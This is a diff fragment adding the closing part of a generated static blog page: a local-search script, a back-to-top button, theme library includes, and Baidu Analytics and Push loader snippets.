+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    var cnt = 1;
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title + "</a>";
+                            cnt += 1;
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                var match_content = content.substr(start, 100);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    str = "<p class=\"search-result-summary\">共找到" + String(cnt-1) + "条结果</p>"  + str;
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+    
+
+    <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?419a24beb94d4fd7fed0042a3b4aaecc";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
